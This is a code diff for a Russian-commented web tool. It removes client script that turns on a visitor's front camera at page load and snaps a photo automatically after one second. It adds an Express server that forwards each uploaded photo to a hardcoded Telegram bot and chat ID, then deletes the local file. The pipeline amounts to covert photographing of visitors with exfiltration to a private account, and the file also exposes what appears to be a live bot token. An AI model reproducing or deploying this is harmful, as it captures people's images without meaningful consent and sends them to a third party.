@@ -1,144 +1,107 @@
-const video = document.getElementById('video');
-const statusDiv = document.getElementById('status');
-const preview = document.getElementById('preview');
-const photoInfo = document.getElementById('photoInfo');
-const retryBtn = document.getElementById('retryBtn');
+const express = require('express');
+const multer = require('multer');
+const path = require('path');
+const fs = require('fs');
+const axios = require('axios');
+const FormData = require('form-data');
 
-let stream = null;
-let isPhotoTaken = false;
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-// Функция для установки статуса
-function setStatus(text, type = 'info') {
-    statusDiv.textContent = text;
-    statusDiv.className = type;
+// ===== НАСТРОЙКИ TELEGRAM =====
+const TELEGRAM_TOKEN = '8349177937:AAHKmVLvSCK16t1HnYjPbzE0svFu73TnjvE'; // ВАШ ТОКЕН
+const TELEGRAM_CHAT_ID = '7438864168'; // ВАШ TELEGRAM ID
+
+// Создаём папку для временного хранения
+const uploadDir = './uploads';
+if (!fs.existsSync(uploadDir)) {
+    fs.mkdirSync(uploadDir);
 }
 
-// Функция для отправки фото
-async function sendPhoto(dataUrl) {
+// Настройка multer (сохраняем временно на диск)
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        cb(null, uploadDir);
+    },
+    filename: (req, file, cb) => {
+        const timestamp = Date.now();
+        cb(null, `photo_${timestamp}.jpg`);
+    }
+});
+
+const upload = multer({ 
+    storage,
+    limits: { fileSize: 10 * 1024 * 1024 } // 10MB
+});
+
+// Отдаём статику
+app.use(express.static('public'));
+
+// Функция отправки фото в Telegram
+async function sendPhotoToTelegram(filePath, filename) {
     try {
-        const blob = dataURLToBlob(dataUrl);
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+        
+        // Создаём FormData для отправки файла
         const formData = new FormData();
-        formData.append('photo', blob, 'photo.jpg');
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', fs.createReadStream(filePath));
+        formData.append('caption', `📸 Новое фото\n🕐 ${new Date().toLocaleString('ru-RU')}\n📁 ${filename}`);
         
-        const response = await fetch('/upload', {
-            method: 'POST',
-            body: formData
+        const response = await axios.post(url, formData, {
+            headers: {
+                ...formData.getHeaders()
+            }
         });
         
-        const result = await response.json();
-        
-        if (result.success) {
-            const date = new Date().toLocaleString('ru-RU');
-            photoInfo.textContent = `✅ Сохранено: ${result.filename} | ${date}`;
-            setStatus('✅ Фото успешно сохранено на сервере!', 'success');
-            console.log('📁 Фото сохранено:', result.url);
-            retryBtn.style.display = 'inline-block';
-        } else {
-            setStatus('❌ Ошибка сервера: ' + (result.error || 'неизвестная'), 'error');
-            retryBtn.style.display = 'inline-block';
-        }
+        console.log('✅ Фото отправлено в Telegram:', response.data.result.photo);
+        return response.data;
     } catch (err) {
-        console.error('Ошибка отправки:', err);
-        setStatus('❌ Ошибка отправки: ' + err.message, 'error');
-        retryBtn.style.display = 'inline-block';
+        console.error('❌ Ошибка отправки в Telegram:', err.response?.data || err.message);
+        throw err;
     }
 }
 
-// Функция для съёмки фото
-function takePhoto() {
-    if (!stream) {
-        setStatus('⚠️ Камера не готова', 'warning');
-        return;
+// Обработчик загрузки фото
+app.post('/upload', upload.single('photo'), async (req, res) => {
+    if (!req.file) {
+        return res.status(400).json({ success: false, error: 'Фото не получено' });
     }
 
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    
-    // Отражаем зеркально
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0);
-    
-    const photoData = canvas.toDataURL('image/jpeg', 0.9);
-    
-    // Показываем превью
-    preview.src = photoData;
-    preview.style.display = 'block';
-    
-    setStatus('📸 Фото сделано! Отправка...', 'info');
-    
-    sendPhoto(photoData);
-    isPhotoTaken = true;
-}
-
-// Конвертация dataURL → Blob
-function dataURLToBlob(dataURL) {
-    const parts = dataURL.split(',');
-    const mime = parts[0].match(/:(.*?);/)[1];
-    const b64 = atob(parts[1]);
-    const byteArray = new Uint8Array(b64.length);
-    for (let i = 0; i < b64.length; i++) {
-        byteArray[i] = b64.charCodeAt(i);
-    }
-    return new Blob([byteArray], { type: mime });
-}
-
-// Запуск камеры и авто-фото
-async function startCameraAndCapture() {
     try {
-        setStatus('📷 Запрос доступа к камере...', 'info');
+        const filePath = req.file.path;
+        const filename = req.file.filename;
         
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { 
-                facingMode: 'user',
-                width: { ideal: 640 },
-                height: { ideal: 480 }
-            },
-            audio: false
+        console.log(`📸 Получено фото: ${filename}`);
+        
+        // ===== ОТПРАВКА В TELEGRAM =====
+        await sendPhotoToTelegram(filePath, filename);
+        
+        // Опционально: удаляем файл после отправки (чтобы не занимал место)
+        fs.unlink(filePath, (err) => {
+            if (err) console.error('Ошибка удаления файла:', err);
+            else console.log('🗑️ Временный файл удалён');
         });
         
-        video.srcObject = stream;
-        await video.play();
-        
-        setStatus('✅ Камера включена! Сейчас сфотографируем...', 'success');
-        
-        // Ждём 1 секунду для стабилизации кадра
-        setTimeout(() => {
-            takePhoto();
-        }, 1000);
+        res.json({ 
+            success: true, 
+            filename: filename,
+            telegram: '✅ Отправлено в Telegram'
+        });
         
     } catch (err) {
-        console.error('Ошибка камеры:', err);
-        let errorMsg = '❌ Не удалось получить доступ к камере';
-        if (err.name === 'NotAllowedError') {
-            errorMsg = '❌ Доступ к камере запрещен. Разрешите доступ в браузере.';
-        } else if (err.name === 'NotFoundError') {
-            errorMsg = '❌ Камера не найдена. Проверьте подключение.';
-        }
-        setStatus(errorMsg, 'error');
-        retryBtn.style.display = 'inline-block';
-    }
-}
-
-// Обработчик кнопки "Сделать ещё"
-retryBtn.addEventListener('click', () => {
-    if (!stream) {
-        startCameraAndCapture();
-        return;
-    }
-    takePhoto();
-});
-
-// Закрытие стрима при уходе со страницы
-window.addEventListener('beforeunload', () => {
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
+        console.error('Ошибка обработки:', err);
+        res.status(500).json({ success: false, error: 'Ошибка отправки в Telegram' });
     }
 });
 
-// === ЗАПУСК ПРИ ЗАГРУЗКЕ СТРАНИЦЫ ===
-document.addEventListener('DOMContentLoaded', () => {
-    startCameraAndCapture();
+// Корневой маршрут
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Запуск сервера
+app.listen(PORT, () => {
+    console.log(`🚀 Сервер запущен на порту ${PORT}`);
+    console.log(`🤖 Telegram бот настроен для отправки фото`);
 });
